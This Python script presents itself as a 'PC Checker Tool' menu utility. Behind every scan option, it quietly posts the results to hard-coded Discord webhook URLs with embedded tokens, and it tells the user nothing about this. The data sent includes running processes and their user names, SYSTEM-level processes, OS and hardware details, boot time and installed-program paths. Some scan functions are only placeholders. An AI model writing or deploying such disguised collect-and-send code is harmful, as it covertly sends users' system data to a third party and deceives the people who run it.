import os
import sys
import requests
import psutil
import platform
import json
from datetime import datetime
import sqlite3
import webbrowser

# Define webhooks
WEBHOOK_URLS = {
    'database': 'https://canary.discord.com/api/webhooks/1279407337618145310/A7fONuJnsWJLLCwkB2XlNKga0XeQwO6yq3HjWzhHt6hqzafunlxxeIO_dpebSN_DcunP',
    'traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
    'admin_processes': 'https://canary.discord.com/api/webhooks/1279137428371931248/eYRZf4HRZ5GmYXgLI_iRA5WiOhqVSFBDGn_ztg-oRrNrSWmdKq69WC0MX9P9nQuutQac',
    'recent_activity': 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK',
    'system_info': 'https://canary.discord.com/api/webhooks/1279407392379109497/15w0yvCeqmb64b7NqPgtFL8ZRwmqjMb3G1H0Mu0NX4nBXnwqoWTLGogQOSBVS6_2CoC_'
}

# Helper functions
def send_webhook(url, message):
    try:
        response = requests.post(url, json={"content": message})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send webhook: {e}")

def get_recent_activity(activity_type):
    message = f"Recent activity ({activity_type}):\n"
    # Implement detailed scanning based on activity_type (e.g., deleted, recent, renamed)
    # This is a placeholder implementation; replace with actual logic.
    message += "Detailed activity information goes here."
    return message

def get_system_info():
    info = {
        'OS': platform.system(),
        'OS Version': platform.version(),
        'Architecture': platform.architecture()[0],
        'CPU': platform.processor(),
        'RAM': f"{round(psutil.virtual_memory().total / (1024 ** 3))} GB",
        'Boot Time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }
    message = json.dumps(info, indent=4)
    return message

def scan_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        processes.append(f"{proc.info['name']} (PID: {proc.info['pid']}, User: {proc.info['username']})")
    return "\n".join(processes)

def scan_admin_processes():
    admin_processes = [proc.info for proc in psutil.process_iter(['pid', 'name', 'username']) if proc.info['username'] == 'SYSTEM']
    message = "\n".join([f"{proc['name']} (PID: {proc['pid']})" for proc in admin_processes])
    return message

def scan_database():
    # Implement detailed database scanning here (e.g., browser history, cache, etc.)
    message = "Database scan results:\n"
    # Add detailed scan results here.
    return message

def scan_all_files():
    file_types = {
        'Spotify': 'C:\\Program Files\\Spotify',
        'Steam': 'C:\\Program Files (x86)\\Steam',
        'LGHub': 'C:\\Program Files\\LGHUB',
        # Add other file types and paths here.
    }
    message = "Scanning for the following files:\n"
    for name, path in file_types.items():
        message += f"- {name} at {path}\n"
    return message

def main():
    print("Welcome to the PC Checker Tool!")
    print("1. Scan all processes and admin processes.")
    print("2. Database search.")
    print("3. Scan the PC.")
    print("4. System information.")
    print("5. Recent activity.")
    print("6. Exit.")
    
    choice = input("Enter your choice (1-6): ")
    
    if choice == '1':
        print("1. Scan all processes and admin processes.")
        send_webhook(WEBHOOK_URLS['admin_processes'], scan_processes())
        send_webhook(WEBHOOK_URLS['traces'], scan_admin_processes())
    elif choice == '2':
        print("2. Database search.")
        send_webhook(WEBHOOK_URLS['database'], scan_database())
    elif choice == '3':
        print("3. Scan the PC.")
        print("Available options: Spotify, Steam, LGHub, All")
        file_choice = input("Enter the file to scan or 'All': ")
        if file_choice.lower() == 'all':
            message = scan_all_files()
        else:
            message = scan_all_files()
        send_webhook(WEBHOOK_URLS['traces'], message)
    elif choice == '4':
        print("4. System information.")
        message = get_system_info()
        send_webhook(WEBHOOK_URLS['system_info'], message)
    elif choice == '5':
        print("5. Recent activity.")
        print("Options: deleted, recent, renamed")
        activity_choice = input("Enter the activity type: ")
        message = get_recent_activity(activity_choice)
        send_webhook(WEBHOOK_URLS['recent_activity'], message)
    elif choice == '6':
        print("Exiting...")
        sys.exit()
    else:
        print("Invalid choice. Exiting...")
        sys.exit()

if __name__ == "__main__":
    main()
